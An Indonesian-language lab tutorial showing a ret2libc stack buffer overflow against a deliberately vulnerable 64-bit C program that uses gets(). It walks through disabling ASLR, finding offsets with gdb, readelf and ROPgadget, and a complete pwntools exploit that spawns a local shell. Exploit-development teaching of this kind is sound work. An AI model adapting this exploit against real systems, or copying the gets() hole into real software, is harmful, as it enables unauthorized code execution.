[x] NO Canary ~ -fno-stack-protector
[x] NO PIE ~ -no-pie
[x] NX ~ tanpa -z execstack
[x] NO ASLR ~ echo 0 > /proc/sys/kernel/randomize_va_space

vuln_program.c

```c
#include<stdio.h>

void foo()
{
    char buffer[40];
    puts("give me your input :)\n");
    gets(buffer);
}

void main()
{
    foo();
}
```

kita kompile dengan cara seperti ini untuk supaya tidak ada perlindungan NX 

```bash
gcc -g -m64 -no-pie -fno-stack-protector -o vuln64 vuln_program.c
```

setting disable untuk perlindungan ASLR pada sistem operasi linux

```bash
echo 0 > /proc/sys/kernel/randomize_va_space
```

jalankan program vuln32 dengan gdb kemudian lakukan checksec

```bash
$gdb -q vuln64
gdb-peda$ checksec 
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

```bash
$ldd vuln64
linux-vdso.so.1 (0x00007ffff7fd3000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7dfa000)
/lib64/ld-linux-x86-64.so.2 (0x00007ffff7fd5000)
```

ditemukan lokasi basis libc di 0x7ffff7dfa000

```bash
$readelf -s /lib/x86_64-linux-gnu/libc.so.6|grep system
   235: 00000000001294c0    99 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.2.5
   613: 00000000000449c0    45 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
  1418: 00000000000449c0    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
```

ditemukan lokasi  system@@GLIBC_2.2.5 di 0x449c0

```bash
$strings -a -t x /lib/x86_64-linux-gnu/libc.so.6|grep /bin/sh
 180519 /bin/sh
```

ditemukan lokasi relatif /bin/sh 0x180519

```bash
$ROPgadget --binary vuln64 |grep "pop rdi"
0x00000000004011cb : pop rdi ; ret
```

ditemukan pop_rdi 0x4011cb

mencari padding (ukuran buffer overflow)

```bash
gdb-peda$ pattern create 100

'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'

gdb-peda$ r
Starting program: /root/You_Tube/Stack_Buffer_Overflow/3/coba 
give me your input :)
  
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x7fffffffe4f0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
RBX: 0x0 
RCX: 0x7ffff7fb4a00 --> 0xfbad2288 
RDX: 0x7ffff7fb68d0 --> 0x0 
RSI: 0x405671 ("AA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\n")
RDI: 0x7fffffffe4f1 ("AA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
RBP: 0x4147414131414162 ('bAA1AAGA')
RSP: 0x7fffffffe528 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
RIP: 0x401159 (<foo+39>: ret)
R8 : 0x4056d5 --> 0x0 
R9 : 0x0 
R10: 0x405010 --> 0x0 
R11: 0x246 
R12: 0x401050 (<_start>: xor    ebp,ebp)
R13: 0x7fffffffe610 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x401152 <foo+32>: call   0x401040 <gets@plt>
   0x401157 <foo+37>: nop
   0x401158 <foo+38>: leave  
=> 0x401159 <foo+39>: ret    
   0x40115a <main>: push   rbp
   0x40115b <main+1>: mov    rbp,rsp
   0x40115e <main+4>: mov    eax,0x0
   0x401163 <main+9>: call   0x401132 <foo>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe528 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0008| 0x7fffffffe530 ("AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0016| 0x7fffffffe538 ("IAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0024| 0x7fffffffe540 ("AJAAfAA5AAKAAgAA6AAL")
0032| 0x7fffffffe548 ("AAKAAgAA6AAL")
0040| 0x7fffffffe550 --> 0x4c414136 ('6AAL')
0048| 0x7fffffffe558 --> 0x40115a (<main>: push   rbp)
0056| 0x7fffffffe560 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000401159 in foo () at coba.c:8
8 }
gdb-peda$ pattern offset 0x4147414131414162
4703800084066812258 found at offset: 48
```

paddingnya 48 bytes + 8 byte sampai diawal RIP = 56 bytes
penyusunan exploit sebagai berikut

```python
#ldd vuln64 0x7ffff7dfa000
#strings -a -t x /lib/x86_64-linux-gnu/libc.so.6|grep /bin/sh 0x180519 
#readelf -s /lib/x86_64-linux-gnu/libc.so.6|grep system 0x0449c0
#pop_rdi 0x00000000004011cb

from pwn import *

p=process('./vuln64')
print(p.recv())

padding = b'A'*56
pop_rdi =p64(0x4011cb)
base_libc = 0x7ffff7dfa000
system = p64(base_libc+0x0449c0)
binsh = p64(base_libc+0x180519)

p.sendline(padding+pop_rdi+binsh+system)
print(p.clean())
p.interactive()
```

dijalankan

```bash
$python3 exploit-nx64.py 
[+] Starting local process './vuln64': pid 4549
b'give me your input :)\n'
b'\n'
[*] Switching to interactive mode
$
```

